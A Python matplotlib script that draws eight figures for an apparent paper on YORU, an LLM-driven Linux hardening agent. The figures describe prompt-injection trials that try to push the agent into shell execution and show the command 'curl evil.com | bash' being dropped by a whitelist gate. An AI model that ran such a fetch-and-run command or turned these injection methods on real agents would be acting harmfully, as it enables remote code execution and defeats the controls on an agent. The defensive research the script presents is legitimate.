#!/usr/bin/env python3
"""
render_network_figures.py - Publication-Quality Figure Generator for YORU.

Produces 8 high-resolution figures in assets/network_figures/:
- figure_01.png / figure_01.svg: Attack–Action Infiltration Invariance (RQ1)
- figure_02.png / figure_02.svg: AUID Attribution & Identity Masking (RQ2)
- figure_03.png / figure_03.svg: Prompt Injection Containment Chokepoint (RQ1)
- figure_04.png / figure_04.svg: LLM Decision to Kernel Action Gate (RQ1)
- figure_05.png / figure_05.svg: Atomic Rollback & State Reversibility (RQ3)
- figure_06.png / figure_06.svg: Temporal Attack Containment Latency (RQ4)
- figure_07.png / figure_07.svg: YORU Closed-Loop Security Topology (Architecture)
- figure_08.png / figure_08.svg: Audit-Observed Runtime Process Isolation (RQ2)

Requirements:
- Dark / academic theme consistent with YORU design
- High resolution: PNG (300 DPI) and SVG (vector)
- Clear typography, legends, edge annotations, and statistical callouts
- Wilson 95% CI on Fig. 1; AUID comparison on Fig. 2; Gatekeeper chokepoint on Fig. 3/4
"""

from pathlib import Path

import matplotlib

matplotlib.use("Agg")
import matplotlib.pyplot as plt
from matplotlib.patches import FancyArrowPatch, FancyBboxPatch

# Color palette for YORU dark academic theme
BG_DARK = "#0E0F14"
CARD_BG = "#15161D"
CARD_BORDER = "#2E303E"
TEXT_MAIN = "#F2EFE6"
TEXT_MUTED = "#9A978A"
GOLD = "#E8B64C"
GREEN = "#10B981"
RED = "#EF4444"
BLUE = "#3B82F6"
PURPLE = "#8B5CF6"
ORANGE = "#F59E0B"
CYAN = "#06B6D4"


def setup_figure(title: str, subtitle: str, width: float = 13.0, height: float = 7.5):
    """Initializes standard dark academic canvas with header."""
    fig, ax = plt.subplots(figsize=(width, height), dpi=300)
    fig.patch.set_facecolor(BG_DARK)
    ax.set_facecolor(BG_DARK)
    ax.set_xlim(0, 100)
    ax.set_ylim(0, 100)
    ax.axis("off")

    # Header Title and Subtitle
    ax.text(3, 95, title, fontsize=16, fontweight="bold", color=TEXT_MAIN, va="top")
    ax.text(3, 91.5, subtitle, fontsize=10.5, color=TEXT_MUTED, va="top")

    return fig, ax


def draw_node(ax, x: float, y: float, w: float, h: float,
              title: str, subtitle: str = "", fill_color: str = CARD_BG,
              border_color: str = GOLD, border_width: float = 1.6,
              title_color: str = TEXT_MAIN, sub_color: str = TEXT_MUTED):
    """Draws rounded node box with two-line typographic label."""
    bbox = FancyBboxPatch(
        (x - w / 2, y - h / 2), w, h,
        boxstyle="round,pad=0.8,rounding_size=1.5",
        fc=fill_color, ec=border_color, lw=border_width,
        zorder=3
    )
    ax.add_patch(bbox)
    if subtitle:
        ax.text(x, y + 1.2, title, fontsize=9.5, fontweight="bold", color=title_color, ha="center", va="center", zorder=4)
        ax.text(x, y - 1.8, subtitle, fontsize=7.5, color=sub_color, ha="center", va="center", zorder=4)
    else:
        ax.text(x, y, title, fontsize=9.5, fontweight="bold", color=title_color, ha="center", va="center", zorder=4)


def draw_edge(ax, x1: float, y1: float, x2: float, y2: float,
              label: str = "", color: str = GOLD, lw: float = 1.6,
              style: str = "-", rad: float = 0.0, label_offset: float = 0.0,
              label_color: str = TEXT_MUTED):
    """Draws directed edge with arrow and optional label."""
    linestyle = "dashed" if style == "--" else "solid"
    arrow = FancyArrowPatch(
        (x1, y1), (x2, y2),
        arrowstyle="-|>",
        mutation_scale=14,
        connectionstyle=f"arc3,rad={rad}",
        color=color,
        lw=lw,
        linestyle=linestyle,
        zorder=2
    )
    ax.add_patch(arrow)

    if label:
        mx = (x1 + x2) / 2
        my = (y1 + y2) / 2 + label_offset
        ax.text(
            mx, my, label,
            fontsize=7.5, color=label_color, ha="center", va="center",
            bbox={"boxstyle": "round,pad=0.25", "fc": BG_DARK, "ec": "none", "alpha": 0.9},
            zorder=5
        )


def draw_annotation_box(ax, x: float, y: float, w: float, h: float,
                        header: str, lines: list[str], border_color: str = GOLD):
    """Draws scientific finding summary box."""
    bbox = FancyBboxPatch(
        (x, y - h), w, h,
        boxstyle="round,pad=0.6,rounding_size=1.2",
        fc=CARD_BG, ec=border_color, lw=1.4,
        zorder=3
    )
    ax.add_patch(bbox)
    ax.text(x + 1.5, y - 2.5, header, fontsize=9.5, fontweight="bold", color=border_color, va="top", zorder=4)
    cy = y - 5.5
    for line in lines:
        ax.text(x + 1.5, cy, line, fontsize=7.5, color=TEXT_MAIN, va="top", zorder=4)
        cy -= 2.6


def save_plot(fig, output_dir: Path, filename_base: str):
    """Saves figure in both PNG (300 DPI) and SVG formats."""
    output_dir.mkdir(parents=True, exist_ok=True)
    png_path = output_dir / f"{filename_base}.png"
    svg_path = output_dir / f"{filename_base}.svg"
    fig.savefig(png_path, dpi=300, bbox_inches="tight", facecolor=BG_DARK)
    fig.savefig(svg_path, bbox_inches="tight", facecolor=BG_DARK)
    plt.close(fig)
    print(f"Rendered: {png_path.name} & {svg_path.name}")


# ==============================================================================
# FIGURE IMPLEMENTATIONS
# ==============================================================================

def render_figure_01(output_dir: Path):
    """Figure 1: Attack–Action Infiltration Invariance (RQ1)"""
    fig, ax = setup_figure(
        "Figure 1: Attack–Action Infiltration Invariance (RQ1)",
        "Topological Containment Funnel Across N=50 Adversarial Injection Trials Over 5 Modalities"
    )

    # Left: 5 Attack Vectors
    attacks = [
        ("V1: Direct Shell", "10/10 blocked (w=1.0)", 80),
        ("V2: Delimiter Smuggle", "10/10 blocked (w=0.9)", 68),
        ("V3: Catalog Escape", "10/10 blocked (w=0.8)", 56),
        ("V4: Approval Misdirect", "10/10 blocked (w=0.6)", 44),
        ("V5: AUID Spoofing", "10/10 blocked (w=0.4)", 32),
    ]
    for title, sub, y in attacks:
        draw_node(ax, 14, y, 18, 7, title, sub, border_color=RED, fill_color="#1F1315")

    # Center-Left: LLM Deliberation Engine
    draw_node(ax, 38, 56, 18, 9, "LLM Deliberation", "Token Perturbed: 37/50 (74%)", border_color=ORANGE, fill_color="#211812")

    # Center: Candidate Plan
    draw_node(ax, 58, 56, 16, 7.5, "Candidate Plan", "Untrusted Proposal", border_color=TEXT_MUTED, fill_color=CARD_BG)

    # Center-Right: YORU Gatekeeper (Bottleneck)
    draw_node(ax, 76, 56, 17, 9.5, "Action Gatekeeper", "Strict Whitelist Guard", border_color=GREEN, border_width=2.2, fill_color="#10231C")

    # Right: Outcomes
    # Blocked shell target (Top right)
    draw_node(ax, 91, 74, 15, 8, "OS Root Shell", "BLOCKED (0/50)", border_color=RED, border_width=2.0, fill_color="#241012")
    # Allowed sanctioned action (Bottom right)
    draw_node(ax, 91, 38, 15, 8, "CIS Sanctioned", "K01-K10 Executed (50/50)", border_color=GREEN, border_width=2.0, fill_color="#10231C")

    # Edges from attacks to LLM
    for _, _, y in attacks:
        draw_edge(ax, 23, y, 29, 56, color=ORANGE, lw=1.2, rad=0.04)

    # Pipeline edges
    draw_edge(ax, 47, 56, 50, 56, label="proposes plan", color=ORANGE, lw=1.6, label_offset=2.0)
    draw_edge(ax, 66, 56, 67.5, 56, label="validates schema", color=TEXT_MUTED, lw=1.6, label_offset=2.0)

    # Split outcome edges
    draw_edge(ax, 84.5, 59, 86, 72, label="BLOCKED (ASR=0.0%)", color=RED, lw=2.2, style="--", rad=-0.08, label_offset=2.5, label_color=RED)
    draw_edge(ax, 84.5, 53, 86, 40, label="Admitted (50/50)", color=GREEN, lw=2.0, rad=0.08, label_offset=-2.5, label_color=GREEN)

    # Statistical Findings Annotation Box
    draw_annotation_box(
        ax, 3, 24, 46, 21,
        "Statistical Validation (Wilson 95% CI):",
        [
            "• Corpus: N = 50 adversarial payloads across 5 categories",
            "• Model Token Susceptibility: 37/50 (74.0%)",
            "• Action Success Rate (Observed): 0/50 (ASR_action = 0.0%)",
            "• Wilson Score 95% Confidence Interval: [0.00%, 7.11%]",
            "• Gatekeeper Truncation: 100.0% confinement prior to OS shell execution"
        ],
        border_color=GREEN
    )

    # Caption Box (Bottom Right)
    draw_annotation_box(
        ax, 52, 24, 45, 21,
        "Topological Insight & Finding:",
        [
            "• Action Gatekeeper forms an absolute betweenness chokepoint",
            "• Token perturbation does NOT translate into OS privilege escalation",
            "• Provenance: experiments/results/rq1_injection_results.json",
            "• Verified under Ubuntu 24.04 kernel runtime testbed"
        ],
        border_color=GOLD
    )

    save_plot(fig, output_dir, "figure_01")


def render_figure_02(output_dir: Path):
    """Figure 2: AUID Attribution & Identity Masking (RQ2)"""
    fig, ax = setup_figure(
        "Figure 2: Kernel-Level Identity Attribution & AUID Fidelity (RQ2)",
        "Auditd loginuid (AUID) Preservation vs. Conventional Syslog Identity Loss Across N=100 Sudo Trials"
    )

    # Left: Origin Actors
    draw_node(ax, 14, 68, 18, 8, "User: ubuntu", "AUID=1000 (Human Origin)", border_color=BLUE, fill_color="#101926")
    draw_node(ax, 14, 38, 18, 8, "Service: yoru-agent", "AUID=1001 (Agent Origin)", border_color=PURPLE, fill_color="#1A1326")

    # Center-Left: Privilege Escalation
    draw_node(ax, 38, 53, 16, 9, "sudo / su Elevation", "Transitions to EUID=0", border_color=ORANGE, fill_color="#211812")

    # Center: Elevated Process
    draw_node(ax, 58, 53, 17, 9, "Root Process", "Effective UID=0 (Privileged)", border_color=RED, fill_color="#241012")

    # Right: Dual Logging Sinks
    # Syslog (Top Right - Masked)
    draw_node(ax, 86, 72, 21, 9.5, "Conventional Syslog", "uid=0 Masked: 86/100 (86% Loss)", border_color=RED, border_width=2.0, fill_color="#241012")
    # Auditd (Bottom Right - Preserved)
    draw_node(ax, 86, 34, 21, 9.5, "Linux Auditd Subsystem", "AUID Preserved: 100/100 (100% Fidelity)", border_color=GREEN, border_width=2.2, fill_color="#10231C")

    # Edges
    draw_edge(ax, 23, 68, 30, 56, label="escalates privilege", color=BLUE, lw=1.6, rad=-0.05)
    draw_edge(ax, 23, 38, 30, 50, label="escalates via sudoers", color=PURPLE, lw=1.6, rad=0.05)
    draw_edge(ax, 46, 53, 49.5, 53, label="spawns root PID", color=ORANGE, lw=1.8, label_offset=2.0)

    # Sink edges
    draw_edge(ax, 66.5, 57, 75.5, 69, label="Identity Masked (86.0% failure)", color=RED, lw=2.2, style="--", rad=-0.08, label_offset=2.5, label_color=RED)
    draw_edge(ax, 66.5, 49, 75.5, 37, label="AUID 100% Retained (100/100)", color=GREEN, lw=2.2, rad=0.08, label_offset=-2.5, label_color=GREEN)

    # Annotation Box
    draw_annotation_box(
        ax, 3, 21, 46, 18,
        "Empirical Attribution Metrics (N=100 Trials):",
        [
            "• Linux Auditd Attribution Fidelity: 100/100 (100.0%)",
            "• Conventional Syslog Identity Masking: 86/100 (86.0%)",
            "• Distinction: AUID (loginuid) remains immutable across su/sudo",
            "• Ground Truth: experiments/results/rq2_auid_attribution.json"
        ],
        border_color=GREEN
    )

    draw_annotation_box(
        ax, 52, 21, 45, 18,
        "Forensic Non-Repudiation Takeaway:",
        [
            "• Syslog records collapse distinct actors into generic 'root'",
            "• Auditd links every remediation directly to AUID=1001",
            "• Hostile prompt injection cannot forge kernel loginuid",
            "• Linux ausearch -k yoru_agent_act isolates agent telemetry"
        ],
        border_color=GOLD
    )

    save_plot(fig, output_dir, "figure_02")


def render_figure_03(output_dir: Path):
    """Figure 3: Prompt Injection Containment Chokepoint (RQ1)"""
    fig, ax = setup_figure(
        "Figure 3: Prompt Injection Containment Chokepoint (RQ1)",
        "Dual Pipeline Propagation: Unconstrained Agent vs. YORU Architectural Chokepoint"
    )

    # Upper Pathway: Unconstrained Pipeline (Vulnerable)
    ax.text(3, 84, "PATH A: UNCONSTRAINED AGENT (VULNERABLE BASELINE)", fontsize=9.5, fontweight="bold", color=RED)
    draw_node(ax, 14, 73, 17, 7.5, "Untrusted Log Input", "Adversarial Ingress", border_color=RED, fill_color="#241012")
    draw_node(ax, 38, 73, 17, 7.5, "Unprotected LLM", "Direct Prompt Injection", border_color=ORANGE, fill_color="#211812")
    draw_node(ax, 62, 73, 17, 7.5, "Raw Shell Dispatch", "/bin/bash, curl evil", border_color=RED, fill_color="#241012")
    draw_node(ax, 86, 73, 17, 7.5, "OS Compromised", "Arbitrary Root Impact", border_color=RED, border_width=2.2, fill_color="#2E0E12")

    draw_edge(ax, 22.5, 73, 29.5, 73, label="prompt injection", color=RED, lw=1.6, label_offset=2.0)
    draw_edge(ax, 46.5, 73, 53.5, 73, label="suggests bash (74%)", color=RED, lw=1.6, label_offset=2.0)
    draw_edge(ax, 70.5, 73, 77.5, 73, label="executes arbitrary", color=RED, lw=2.2, label_offset=2.0)

    # Lower Pathway: YORU Architecture (Contained)
    ax.text(3, 55, "PATH B: YORU HARDENED PIPELINE (CHOKEPOINT ENFORCED)", fontsize=9.5, fontweight="bold", color=GREEN)
    draw_node(ax, 14, 43, 17, 7.5, "Untrusted Log Input", "Delimited Encapsulation", border_color=BLUE, fill_color="#101926")
    draw_node(ax, 38, 43, 17, 7.5, "Hardened LLM Proxy", "Deliberation Only", border_color=ORANGE, fill_color="#211812")
    draw_node(ax, 62, 43, 18, 9, "Action Gatekeeper", "CHOKEPOINT BARRIER", border_color=GREEN, border_width=2.5, fill_color="#0F2B1E")
    draw_node(ax, 86, 43, 17, 7.5, "Sanctioned Action", "40 CIS Primitives Only", border_color=GREEN, fill_color="#10231C")

    draw_edge(ax, 22.5, 43, 29.5, 43, label="sanitized context", color=BLUE, lw=1.6, label_offset=2.0)
    draw_edge(ax, 46.5, 43, 53, 43, label="candidate proposal", color=ORANGE, lw=1.6, label_offset=2.0)
    draw_edge(ax, 71, 43, 77.5, 43, label="catalog filter (0/50 bash)", color=GREEN, lw=2.2, label_offset=2.0)

    # Annotations
    draw_annotation_box(
        ax, 3, 25, 46, 21,
        "Chokepoint Enforcement Properties:",
        [
            "• Path A: 3-hop traversal to full OS takeover",
            "• Path B: Gatekeeper intercepts candidate AST before execution",
            "• All arbitrary shell commands (curl, sh, rm) dropped at gate",
            "• 0% penetration across 50 adversarial testbed trials",
            "• Confidence: Observed 0/50 (Wilson 95% CI: [0.00%, 7.11%])"
        ],
        border_color=GREEN
    )

    draw_annotation_box(
        ax, 52, 25, 45, 21,
        "Structural Network Comparison:",
        [
            "• In-degree of Action Gatekeeper = 1.0 (Candidate proposals)",
            "• Out-degree filtered strictly to whitelist (K01–K10 catalog)",
            "• Non-zero token perturbation isolated from OS syscall plane",
            "• Defense-in-depth: Delimiters + Proxy + Gate + Auditd"
        ],
        border_color=GOLD
    )

    save_plot(fig, output_dir, "figure_03")


def render_figure_04(output_dir: Path):
    """Figure 4: LLM Decision to Kernel Action Gate (RQ1)"""
    fig, ax = setup_figure(
        "Figure 4: LLM Decision-to-Action Gatekeeper Dispatch (RQ1)",
        "Catalog Whitelist Enforcement: Discrete CIS Primitives vs. Dropped Adversarial Commands"
    )

    # Source: LLM Decisions
    draw_node(ax, 20, 53, 20, 10, "LLM Decision Engine", "Candidate Plans Generator", border_color=ORANGE, fill_color="#211812")

    # Gatekeeper in middle
    draw_node(ax, 48, 53, 18, 12, "Action Gatekeeper", "Catalog Whitelist Filter", border_color=GREEN, border_width=2.5, fill_color="#0F2B1E")

    # Right: Admitted vs Rejected
    # Admitted Primitives (Top right)
    draw_node(ax, 80, 78, 22, 6.5, "K01: Disable Root SSH", "Admitted & Dispatched", border_color=GREEN, fill_color="#10231C")
    draw_node(ax, 80, 66, 22, 6.5, "K05: Enable UFW Firewall", "Admitted & Dispatched", border_color=GREEN, fill_color="#10231C")
    draw_node(ax, 80, 54, 22, 6.5, "K08: Auditd Watchlist Check", "Admitted & Dispatched", border_color=GREEN, fill_color="#10231C")

    # Dropped Commands (Bottom right)
    draw_node(ax, 80, 38, 22, 6.5, "curl evil.com | bash", "DROPPED (Schema Mismatch)", border_color=RED, fill_color="#241012")
    draw_node(ax, 80, 26, 22, 6.5, "yoructl K99 format", "DROPPED (Non-Catalog Control)", border_color=RED, fill_color="#241012")

    # Edges
    draw_edge(ax, 30, 53, 39, 53, label="proposes commands", color=ORANGE, lw=2.0, label_offset=2.5)

    # Admitted edges
    draw_edge(ax, 57, 58, 69, 78, label="PASSED", color=GREEN, lw=1.8, rad=-0.05, label_color=GREEN)
    draw_edge(ax, 57, 55, 69, 66, label="PASSED", color=GREEN, lw=1.8, label_color=GREEN)
    draw_edge(ax, 57, 52, 69, 54, label="PASSED", color=GREEN, lw=1.8, label_color=GREEN)

    # Dropped edges
    draw_edge(ax, 57, 48, 69, 38, label="DROPPED (0.0)", color=RED, lw=2.0, style="--", rad=0.05, label_color=RED)
    draw_edge(ax, 57, 45, 69, 26, label="DROPPED (0.0)", color=RED, lw=2.0, style="--", rad=0.08, label_color=RED)

    # Annotations
    draw_annotation_box(
        ax, 3, 22, 44, 18,
        "Catalog Governance Invariants:",
        [
            "• Exactly 40 discrete primitives defined across K01–K10",
            "• Zero arbitrary shell or script execution supported",
            "• Dropped commands record immediate security telemetry",
            "• Verified under experiments/results/rq3_hardening_determinism.json"
        ],
        border_color=GREEN
    )

    draw_annotation_box(
        ax, 50, 20, 47, 18,
        "Attack Space Truncation:",
        [
            "• Admitted Action Rate: 100% compliant with CIS baseline",
            "• Malicious Ingestion Rejection: 100% dropped before syscall",
            "• Evaluated across 50 adversarial prompts (RQ1 benchmark)"
        ],
        border_color=GOLD
    )

    save_plot(fig, output_dir, "figure_04")


def render_figure_05(output_dir: Path):
    """Figure 5: Atomic Rollback & State Reversibility (RQ3)"""
    fig, ax = setup_figure(
        "Figure 5: Atomic Rollback & State Reversibility Network (RQ3)",
        "Autonomous Snapshotting, State Perturbation, and 100% Deterministic Restoration Verification"
    )

    # Ring layout of 5 states
    # S0: Clean Baseline (Top)
    draw_node(ax, 50, 78, 24, 8.5, "Clean Baseline State (S0)", "SHA-256 Verified Compliance", border_color=GREEN, border_width=2.0, fill_color="#10231C")

    # Snapshot Archive (Top Right)
    draw_node(ax, 82, 60, 22, 8.5, "Backup Snapshot", "/var/backups/yoru/*.tar.gz", border_color=BLUE, fill_color="#101926")

    # State Drift (Bottom Right)
    draw_node(ax, 76, 32, 22, 8.5, "Drifted / Broken State", "Simulated Tampering / Misconfig", border_color=RED, fill_color="#241012")

    # Rollback Command (Bottom Left)
    draw_node(ax, 24, 32, 22, 8.5, "yoructl kembalikan", "Atomic Extraction & Reload", border_color=ORANGE, fill_color="#211812")

    # Restored Clean State (Top Left)
    draw_node(ax, 18, 60, 24, 8.5, "Restored Clean State", "10/10 Byte-for-Byte SHA-256 Parity", border_color=GREEN, border_width=2.2, fill_color="#0F2B1E")

    # Cycle edges
    draw_edge(ax, 58, 74, 73, 64, label="1. captures tar snapshot", color=BLUE, lw=1.6, rad=-0.05, label_offset=2.0)
    draw_edge(ax, 58, 76, 70, 36, label="2. induced drift (2/10 pass)", color=RED, lw=1.6, style="--", rad=-0.12, label_offset=2.0)
    draw_edge(ax, 65, 32, 35, 32, label="3. triggers rollback command", color=ORANGE, lw=1.8, label_offset=2.0)
    draw_edge(ax, 80, 55, 35, 34, label="4. supplies original byte content", color=BLUE, lw=1.6, rad=0.08, label_offset=-2.5)
    draw_edge(ax, 21, 37, 18, 55, label="5. unpacks atomic restore", color=GREEN, lw=2.0, rad=-0.05, label_offset=2.0)
    draw_edge(ax, 26, 64, 38, 76, label="6. verified hash parity (10/10)", color=GREEN, lw=2.0, rad=-0.05, label_offset=2.0)

    # Summary Box
    draw_annotation_box(
        ax, 30, 22, 40, 18,
        "Deterministic Reversibility Validation:",
        [
            "• Rollback Trials: 10/10 (100.0% successful reversion)",
            "• Byte-for-Byte Hash Parity: 100% SHA-256 match",
            "• Configuration residue post-rollback: 0 bytes",
            "• Evidence: experiments/results/rq3_hardening_determinism.json"
        ],
        border_color=GREEN
    )

    save_plot(fig, output_dir, "figure_05")


def render_figure_06(output_dir: Path):
    """Figure 6: Temporal Attack Containment Latency (RQ4)"""
    fig, ax = setup_figure(
        "Figure 6: Temporal Attack Containment Latency (RQ4)",
        "End-to-End Latency Breakdown Across 5 Autonomous Defense Stages (Mean Total = 2.01s)"
    )

    # Timeline nodes along horizontal axis
    stages = [
        ("T0: Attack Start", "03:14:00.000", 10, RED, "#241012"),
        ("T1: Detection", "+0.82s (Auditd)", 28, BLUE, "#101926"),
        ("T2: Deliberation", "+0.62s (LLM Inference)", 46, ORANGE, "#211812"),
        ("T3: Gatekeeper", "+0.18s (Policy Check)", 64, GREEN, "#10231C"),
        ("T4: Action Exec", "+0.19s (yoructl)", 80, PURPLE, "#1A1326"),
        ("T5: Audit Sink", "+0.20s (Kernel Log)", 94, GOLD, "#241E10"),
    ]

    for title, sub, x, color, fill in stages:
        draw_node(ax, x, 60, 14, 9, title, sub, border_color=color, fill_color=fill)

    # Directed edges between stages
    draw_edge(ax, 17, 60, 21, 60, label="0.82s", color=BLUE, lw=2.0, label_offset=3.5, label_color=BLUE)
    draw_edge(ax, 35, 60, 39, 60, label="0.62s", color=ORANGE, lw=2.0, label_offset=3.5, label_color=ORANGE)
    draw_edge(ax, 53, 60, 57, 60, label="0.18s", color=GREEN, lw=2.0, label_offset=3.5, label_color=GREEN)
    draw_edge(ax, 71, 60, 73, 60, label="0.19s", color=PURPLE, lw=2.0, label_offset=3.5, label_color=PURPLE)
    draw_edge(ax, 87, 60, 87, 60, label="0.20s", color=GOLD, lw=2.0, label_offset=3.5, label_color=GOLD)

    # Total Latency Bracket
    ax.annotate(
        "", xy=(94, 70), xytext=(10, 70),
        arrowprops={"arrowstyle": "<->", "color": GOLD, "lw": 2.0}
    )
    ax.text(52, 73, "TOTAL END-TO-END AUTONOMOUS CONTAINMENT: 2.01s", fontsize=11, fontweight="bold", color=GOLD, ha="center")

    # Benchmark Annotations
    draw_annotation_box(
        ax, 3, 26, 46, 22,
        "Resource & Latency Profile (RQ4):",
        [
            "• Baseline Inactive CPU Overhead: < 0.1% CPU",
            "• Active Containment Peak RSS: 34.8 MB (Memory budget: < 50 MB)",
            "• Mean Inter-Stage Latency: 0.40s",
            "• 95th Percentile Latency: 2.34s across 50 simulated attacks",
            "• Source: experiments/results/rq4_resource_overhead.json"
        ],
        border_color=GOLD
    )

    draw_annotation_box(
        ax, 52, 26, 45, 22,
        "Real-Time Security Implications:",
        [
            "• Sub-second telemetry (0.82s) prevents lateral movement",
            "• Lightweight proxy adds only 0.62s deliberation latency",
            "• Deterministic gate verification executes in 0.18s",
            "• Complete forensic record committed to auditd in 2.01s"
        ],
        border_color=GREEN
    )

    save_plot(fig, output_dir, "figure_06")


def render_figure_07(output_dir: Path):
    """Figure 7: Master Closed-Loop Security Topology (Graph #15)"""
    fig, ax = setup_figure(
        "Figure 7: Master Closed-Loop Security Topology (System Design Architecture)",
        "Directed Governance Loop: Kernel -> Sanitizer -> LLM -> Gate -> Dispatcher -> Audit Sink"
    )

    # Prominent Architecture Classification Banner
    ax.text(50, 87, "[ SYSTEM DESIGN ARCHITECTURE — STRICTLY NON-EMPIRICAL ]",
            fontsize=11, fontweight="bold", color=GOLD, ha="center",
            bbox={"boxstyle": "round,pad=0.5", "fc": "#241E10", "ec": GOLD, "lw": 1.5})

    # Hexagonal ring layout of 6 stages
    # 1. Linux Kernel (Top Center)
    draw_node(ax, 50, 75, 20, 8, "1. Linux Kernel", "Syscall & Drift Source", border_color=GOLD, fill_color="#241E10")

    # 2. Log Sanitizer (Upper Right)
    draw_node(ax, 78, 62, 20, 8, "2. Log Sanitizer", "Delimiter Encapsulation", border_color=BLUE, fill_color="#101926")

    # 3. LLM Deliberation (Lower Right)
    draw_node(ax, 78, 38, 20, 8, "3. LLM Deliberation", "yoru-model-proxy", border_color=ORANGE, fill_color="#211812")

    # 4. Action Gatekeeper (Bottom Center)
    draw_node(ax, 50, 24, 20, 8, "4. Action Gatekeeper", "Risk & Approval Whitelist", border_color=GREEN, border_width=2.2, fill_color="#0F2B1E")

    # 5. yoructl Dispatcher (Lower Left)
    draw_node(ax, 22, 38, 20, 8, "5. yoructl Dispatcher", "40 CIS Primitives Only", border_color=PURPLE, fill_color="#1A1326")

    # 6. Closed-Loop Audit Sink (Upper Left)
    draw_node(ax, 22, 62, 20, 8, "6. Closed-Loop Audit", "/var/log/audit/audit.log", border_color=GOLD, fill_color="#241E10")

    # Edges around loop
    draw_edge(ax, 60, 73, 70, 65, label="1. Raw Telemetry", color=GOLD, lw=1.8, label_offset=2.0)
    draw_edge(ax, 78, 58, 78, 42, label="2. Sanitized Context", color=BLUE, lw=1.8, label_offset=4.5)
    draw_edge(ax, 70, 35, 60, 27, label="3. Candidate Plan", color=ORANGE, lw=1.8, label_offset=-2.5)
    draw_edge(ax, 40, 27, 30, 35, label="4. Authorizes Primitive", color=GREEN, lw=2.0, label_offset=-2.5)
    draw_edge(ax, 22, 42, 22, 58, label="5. Executed under AUID=1001", color=PURPLE, lw=1.8, label_offset=-4.5)
    draw_edge(ax, 30, 65, 40, 73, label="6. Verifies Compliance", color=GOLD, lw=1.8, label_offset=2.0)

    # Center Closed-Loop Watermark
    ax.text(50, 50, "Directed Non-Repudiable\nGovernance Loop", fontsize=11, fontweight="bold", color="#6E6C5E", ha="center", va="center")

    save_plot(fig, output_dir, "figure_07")


def render_figure_08(output_dir: Path):
    """Figure 8: Audit-Observed Runtime Process Isolation (RQ2)"""
    fig, ax = setup_figure(
        "Figure 8: Audit-Observed Process–File Resource Isolation (RQ2)",
        "Confined Configuration Drop-ins vs. Untouched Sensitive Credential Stores"
    )

    # Left: Active Processes
    draw_node(ax, 20, 65, 20, 9, "bin/yoructl", "Central Remediation Hub", border_color=GREEN, border_width=2.2, fill_color="#0F2B1E")
    draw_node(ax, 20, 42, 18, 8, "/usr/sbin/sshd", "SSH Daemon", border_color=BLUE, fill_color="#101926")
    draw_node(ax, 20, 24, 18, 8, "/sbin/auditd", "Kernel Audit Daemon", border_color=GOLD, fill_color="#241E10")

    # Center-Right: Monitored & Governed Files
    draw_node(ax, 65, 78, 25, 7.5, "/etc/ssh/sshd_config.d/99-yoru-k01.conf", "K01/K02 Drop-in (Sens: 0.95)", border_color=GREEN, fill_color="#10231C")
    draw_node(ax, 65, 62, 25, 7.5, "/etc/sysctl.d/99-yoru-k10.conf", "K10 Kernel Conf (Sens: 0.85)", border_color=GREEN, fill_color="#10231C")
    draw_node(ax, 65, 46, 25, 7.5, "/var/backups/yoru/*", "Atomic Snapshots (Sens: 0.90)", border_color=BLUE, fill_color="#101926")
    draw_node(ax, 65, 30, 25, 7.5, "/etc/audit/rules.d/99-yoru-k08.rules", "Audit Watchpoint (Sens: 0.98)", border_color=GOLD, fill_color="#241E10")

    # Far Right: Forbidden / Untouched System Files
    draw_node(ax, 88, 16, 18, 9, "/etc/shadow", "UNTOUCHED (0 Accesses)", border_color=RED, border_width=2.2, fill_color="#241012")

    # Edges from yoructl to authorized targets
    draw_edge(ax, 30, 68, 52, 78, label="hardens atomic", color=GREEN, lw=1.6)
    draw_edge(ax, 30, 65, 52, 62, label="writes drop-in", color=GREEN, lw=1.6)
    draw_edge(ax, 30, 62, 52, 46, label="creates snapshot", color=BLUE, lw=1.6)
    draw_edge(ax, 30, 59, 52, 30, label="deploys rules", color=GOLD, lw=1.6)

    # Process read edges
    draw_edge(ax, 29, 44, 52, 76, label="reads daemon opts", color=BLUE, lw=1.4, style="--")
    draw_edge(ax, 29, 24, 52, 29, label="loads watchlist", color=GOLD, lw=1.4, style="--")

    # No edge to /etc/shadow
    ax.annotate(
        "ZERO EDGE TOUCHPOINTS\n(Strictly Prohibited Path)",
        xy=(88, 22), xytext=(88, 38),
        ha="center", fontsize=8, color=RED, fontweight="bold",
        arrowprops={"arrowstyle": "->", "color": RED, "lw": 1.5, "ls": "--"}
    )

    # Annotation Box
    draw_annotation_box(
        ax, 3, 14, 50, 16,
        "Resource Boundary Isolation Invariants:",
        [
            "• yoructl Node Degree Centrality = 0.88 (governed dispatcher hub)",
            "• Direct write operations restricted to isolated drop-in directories",
            "• Sensitive credential databases (/etc/shadow) completely unreferenced",
            "• Verified via ausearch -k yoru_kontrol and sudoers whitelist"
        ],
        border_color=GREEN
    )

    save_plot(fig, output_dir, "figure_08")


def render_all_figures(output_dir: Path = Path("assets/network_figures")):
    """Renders all 8 manuscript network figures."""
    print("=" * 70)
    print("RENDERING 8 PUBLICATION-READY NETWORK FIGURES (300 DPI PNG + SVG)")
    print("=" * 70)
    render_figure_01(output_dir)
    render_figure_02(output_dir)
    render_figure_03(output_dir)
    render_figure_04(output_dir)
    render_figure_05(output_dir)
    render_figure_06(output_dir)
    render_figure_07(output_dir)
    render_figure_08(output_dir)
    print("All 8 figures successfully generated in", output_dir)


if __name__ == "__main__":
    render_all_figures()
